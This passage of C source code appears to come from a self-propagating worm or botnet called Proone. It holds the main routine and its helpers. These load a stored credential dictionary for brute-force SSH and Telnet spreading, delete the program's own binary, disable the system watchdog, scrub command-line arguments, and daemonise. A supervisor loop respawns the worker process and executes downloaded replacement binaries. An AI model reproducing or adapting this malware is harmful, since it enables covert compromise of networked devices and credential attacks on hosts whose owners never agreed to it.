		if (!ret) {
			goto END;
		}
		if (fd >= 0) {
			break;
		}

		goto END;
	} while (false);

	prne_s_g = (struct prne_shared_global*)mmap(
		NULL,
		sizeof(struct prne_shared_global),
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		fd,
		0);
	if (prne_s_g == MAP_FAILED) {
		prne_s_g = NULL;
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
			prne_dbgperr("** Failed to initialise shared global");
		}
	}
	else {
		// Session init code goes here
		prne_memzero(prne_s_g->upbin_path, sizeof(prne_s_g->upbin_path));
		prne_memzero(prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));
	}

END:
	prne_close(fd);
	prne_dvault_reset();

	return ret;
}

static void deinit_shared_global (void) {
	if (prne_s_g != NULL) {
		munmap(prne_s_g, sizeof(struct prne_shared_global));
		prne_s_g = NULL;
	}
	prne_close(prne_g.shm_fd);
	prne_g.shm_fd = -1;
}

static void gen_id (uint8_t *id) {
	mbedtls_ctr_drbg_random(&prne_g.ssl.rnd, id, 16);
}

static void init_ids (void) {
	char line[37];
	int fd = -1;

	if (prne_s_g != NULL) {
		if (prne_chkcmem(prne_s_g->instance_id, 16, prne_ciszero)) {
			gen_id(prne_s_g->instance_id);
		}
		memcpy(prne_g.instance_id, prne_s_g->instance_id, 16);
	}
	else {
		gen_id(prne_g.instance_id);
	}

	do { // fake loop
		fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
		if (fd < 0) {
			break;
		}

		if (read(fd, line, 36) != 36) {
			break;
		}
		line[36] = 0;

		if (!prne_uuid_fromstr(line, prne_g.boot_id)) {
			break;
		}
	} while (false);
	prne_close(fd);
}

static void set_host_credential (const char *str) {
	if (prne_s_g == NULL) {
		return;
	}

	mbedtls_base64_decode(
		prne_s_g->host_cred_data,
		sizeof(prne_s_g->host_cred_data),
		&prne_s_g->host_cred_len,
		(const unsigned char*)str,
		prne_nstrlen(str));
}

static void set_org_id (const char *str) {
	size_t olen;

	if (prne_s_g == NULL) {
		return;
	}

	mbedtls_base64_decode(
		prne_s_g->org_id,
		16,
		&olen,
		(const unsigned char*)str,
		prne_nstrlen(str));
}

static void rm_args (int *argc, char **args) {
#if PRNE_HOST_OS == PRNE_OS_LINUX
	for (int i = 1; i < *argc; i += 1) {
		prne_strzero(args[i]);
	}
	*argc = 1;
#else
	#error "FIXME"
#endif
}

static void do_exec (const char *exec, char **args) {
	sigset_t ss, old_ss;
	bool has_ss;

	sigfillset(&ss);

	// Clean the house for the new image.
	// Free any resource that survives exec() call.
	deinit_shared_global();
	has_ss = sigprocmask(SIG_UNBLOCK, &ss, &old_ss) == 0;

	execv(exec, args);
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
		prne_dbgperr("** exec()");
	}

	// exec() failed
	// Restore previous condifion
	if (has_ss) {
		sigprocmask(SIG_BLOCK, &old_ss, NULL);
	}
	init_shared_global();
}

static void run_upbin (void) {
	char **args = NULL;
	char *add_args[1] = { NULL };
	char *m_args = NULL;
	const char *path = prne_s_g->upbin_path;

	// copy data from shared global as it will be unmapped before exec() call.
	add_args[0] = prne_dup_str(
		prne_dvault_get_cstr(PRNE_DATA_KEY_EXEC_NAME, NULL));
	prne_dvault_reset();
	m_args = prne_malloc(1, sizeof(prne_s_g->upbin_args));
	if (add_args[0] == NULL || m_args == NULL) {
		goto END;
	}
	memcpy(m_args, prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));

	if (rename(prne_s_g->upbin_path, add_args[0]) != 0) {
		goto END;
	}
	path = add_args[0];

	args = prne_htbt_parse_args(
		m_args,
		sizeof(prne_s_g->upbin_args),
		1,
		add_args,
		NULL,
		SIZE_MAX);
	if (args == NULL) {
		goto END;
	}

	do_exec(args[0], args);

END:
	unlink(path);
	prne_s_g->upbin_path[0] = 0;

	prne_strzero(add_args[0]);
	prne_free(add_args[0]);
	prne_free(m_args);
	prne_free(args);
}

static bool bne_cb_enter_dd (void *ctx) {
	prne_dvault_get_bin(PRNE_DATA_KEY_CRED_DICT, NULL);
	return true;
}

static void bne_cb_exit_dd (void *ctx) {
	prne_dvault_reset();
}

static uint64_t bne_cb_uptime (void *ctx) {
	return prne_sub_timespec(
		prne_gettime(CLOCK_MONOTONIC),
		prne_g.child_start).tv_sec;
}

static int bne_cb_vercmp (void *ctx, const uint8_t *uuid) {
	size_t l;
	const void *ver_mat;
	int ret;

	if (memcmp(
			prne_dvault_get_bin(PRNE_DATA_KEY_PROG_VER, NULL),
			uuid,
			16) == 0)
	{
		ret = 0;
		goto END;
	}

	ver_mat = prne_dvault_get_bin(PRNE_DATA_KEY_VER_MAT, &l);
	prne_dbgast(l % 16 == 0);
	if (bsearch(uuid, ver_mat, l / 16, 16, prne_cmp_uuid_asc) == NULL) {
		ret = -1;
	}
	else {
		ret = 1;
	}

END:
	prne_dvault_reset();
	return ret;
}

static char *bne_cb_exec_name (void *ctx) {
	char *ret = prne_dup_str(
		prne_dvault_get_cstr(PRNE_DATA_KEY_EXEC_NAME, NULL));
	prne_dvault_reset();
	return ret;
}

static char *bne_cb_lock_name (void *ctx) {
	char *ret = prne_dup_str(
		prne_dvault_get_cstr(PRNE_DATA_KEY_BNE_LOCK_NAME, NULL));
	prne_dvault_reset();
	return ret;
}

static void init_bne (void) {
	static const prne_bne_vector_t VEC_ARR[] = {
		PRNE_BNE_V_HTBT,
		PRNE_BNE_V_BRUTE_SSH,
		PRNE_BNE_V_BRUTE_TELNET
	};
	size_t dvl;
	const uint8_t *m;

	prne_init_cred_dict(&prne_g.cred_dict);
	prne_init_llist(&bne_list);
	prne_init_bne_param(&bne_param);

	m = prne_dvault_get_bin(PRNE_DATA_KEY_CRED_DICT, &dvl);
	prne_dser_cred_dict(&prne_g.cred_dict, m, dvl);
	bne_param.cred_dict = &prne_g.cred_dict;
	prne_dvault_reset();

	if (prne_g.c_ssl.ready) {
		bne_param.htbt_ssl_conf = &prne_g.c_ssl.conf;
	}
	bne_param.org_id = prne_g.instance_id;

	bne_param.vector.arr = VEC_ARR;
	bne_param.vector.cnt = sizeof(VEC_ARR)/sizeof(prne_bne_vector_t);

	bne_param.cb.exec_name = bne_cb_exec_name;
	bne_param.cb.enter_dd = bne_cb_enter_dd;
	bne_param.cb.exit_dd = bne_cb_exit_dd;
	bne_param.cb.uptime = bne_cb_uptime;
	bne_param.cb.vercmp = bne_cb_vercmp;
	bne_param.cb.tmpfile = cb_tmpfile;
	bne_param.cb.upbin = cb_upbin;
	bne_param.cb.bne_lock_name = bne_cb_lock_name;

	if (prne_g.has_ba) {
		bne_param.rcb = &prne_g.rcb_param;
	}
	bne_param.login_attempt = PRNE_BNE_LOGIN_ATTEMPT;
}

static void deinit_bne (void) {
	prne_free_llist(&bne_list);
	prne_free_cred_dict(&prne_g.cred_dict);
	prne_free_bne_param(&bne_param);
}

static bool has_upbin (void) {
	return prne_s_g != NULL && strlen(prne_s_g->upbin_path) > 0;
}


int main (int argc, char **args) {
	static int exit_code;
	static bool loop = true;
	static sigset_t ss_all;

	// done with the terminal
	close(STDIN_FILENO);
#if !PRNE_DEBUG
	// Some stupid library can use these
	close(STDOUT_FILENO);
	close(STDERR_FILENO);
#endif

	sigemptyset(&ss_all);
	sigaddset(&ss_all, SIGINT);
	sigaddset(&ss_all, SIGTERM);
	sigaddset(&ss_all, SIGCHLD);
	signal(SIGPIPE, SIG_IGN);

	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
	prne_g.blackhole[0] = -1;
	prne_g.blackhole[1] = -1;
	prne_g.shm_fd = -1;
	prne_init_rcb_param(&prne_g.rcb_param);
	prne_g.bin_host.os = PRNE_HOST_OS;
	prne_g.bin_host.arch = PRNE_HOST_ARCH;
	prne_g.rcb_param.ba = &prne_g.bin_archive;
	prne_g.rcb_param.self = &prne_g.bin_host;
	prne_init_bin_archive(&prne_g.bin_archive);
	mbedtls_x509_crt_init(&prne_g.ssl.ca);
	prne_mbedtls_entropy_init(&prne_g.ssl.entpy);
	mbedtls_ctr_drbg_init(&prne_g.ssl.rnd);
	mbedtls_ssl_config_init(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
	mbedtls_pk_init(&prne_g.s_ssl.pk);
	mbedtls_dhm_init(&prne_g.s_ssl.dhm);
	mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
	mbedtls_pk_init(&prne_g.c_ssl.pk);

	open_blackhole();
	init_proone(args[0]);

	/* inits that need outside resources. IN THIS ORDER! */
	seed_ssl_rnd(false);
	load_ssl_conf();
	if (!init_shared_global()) {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_FATAL) {
			prne_dbgpf("*** Another instance detected.\n");
		}
		exit_code = PRNE_PROONE_EC_LOCK;
		goto END;
	}
	if (argc > 1) {
		set_host_credential(args[1]);
	}
	if (argc > 2) {
		set_org_id(args[2]);
	}
	init_ids();
	init_bne();
	delete_myself(args[0]);
	disasble_watchdog();
	rm_args(&argc, args);

	// post-init
	{
		// daemonise
		const pid_t f_ret = fork();

		if (f_ret < 0) {
			exit_code = PRNE_PROONE_EC_FAIL;
			goto END;
		}
		else if (f_ret == 0) {
			prne_g.parent_pid = getpid();
			setsid();
		}
		else {
			goto END;
		}
	}


	sigprocmask(SIG_BLOCK, &ss_all, NULL);
	// main loop
	while (loop) {
		prne_g.child_pid = fork();

		if (prne_g.child_pid > 0) {
			static int status, caught_signal;
			static pid_t f_ret;
			static sigset_t ss;

			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
				prne_dbgpf("* Child: %d\n", prne_g.child_pid);
			}

WAIT_LOOP:
			prne_assert(sigwait(&ss_all, &caught_signal) == 0);

			switch (caught_signal) {
			case SIGINT:
				// Exit requested. Notify the child and wait for it to exit.
				loop = false;
				sigemptyset(&ss);
				sigaddset(&ss, SIGINT);
				sigprocmask(SIG_UNBLOCK, &ss, NULL);
				kill(prne_g.child_pid, SIGTERM);
				goto WAIT_LOOP;
			case SIGCHLD:
				f_ret = waitpid(prne_g.child_pid, &status, 0);
				if (f_ret != prne_g.child_pid) {
					abort();
				}
				break;
			default: goto WAIT_LOOP;
			}

			if (prne_s_g != NULL) {
				if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
					prne_s_g->crash_cnt += 1;
				}
			}

			if (WIFEXITED(status)) {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
					prne_dbgpf(
						"Child process %d exited with code %d.\n",
						prne_g.child_pid,
						WEXITSTATUS(status));
				}
				if (WEXITSTATUS(status) == 0) {
					if (has_upbin()) {
						if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_INFO) {
							prne_dbgpf(
								"Detected new bin: %s\n"
								"Attempting exec()\n",
								prne_s_g->upbin_path);
						}
						run_upbin();
						// run_upbin() returns if fails
					}
					else {
						break;
					}
				}
			}
			else if (WIFSIGNALED(status)) {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
					prne_dbgpf(
						"** Child process %d received signal %d!\n",
						prne_g.child_pid,
						WTERMSIG(status));
				}
			}

			if (has_upbin()) {
				unlink(prne_s_g->upbin_path);
				prne_s_g->upbin_path[0] = 0;
			}

			sleep(1);
		}
		else if (prne_g.child_pid == 0) {
			prne_close(prne_g.shm_fd);
			prne_g.shm_fd = -1;
			sigprocmask(SIG_UNBLOCK, &ss_all, NULL);

			prne_g.is_child = true;
			prne_g.child_start = prne_gettime(CLOCK_MONOTONIC);
			prne_g.child_pid = getpid();

			exit_code = proone_main();
			break;
		}
		else {
			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
				prne_dbgperr("** fork()");
			}
			sleep(1);
		}
	}
	prne_g.child_pid = 0;

END:
	deinit_bne();
	prne_free_rcb_param(&prne_g.rcb_param);
	prne_free_bin_archive(&prne_g.bin_archive);

	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
	mbedtls_pk_free(&prne_g.s_ssl.pk);
	mbedtls_dhm_free(&prne_g.s_ssl.dhm);
	mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
	mbedtls_pk_free(&prne_g.c_ssl.pk);
	mbedtls_x509_crt_free(&prne_g.ssl.ca);
	mbedtls_ctr_drbg_free(&prne_g.ssl.rnd);
	mbedtls_entropy_free(&prne_g.ssl.entpy);

	deinit_shared_global();
	deinit_proone();
	close_blackhole();

	return exit_code;
}
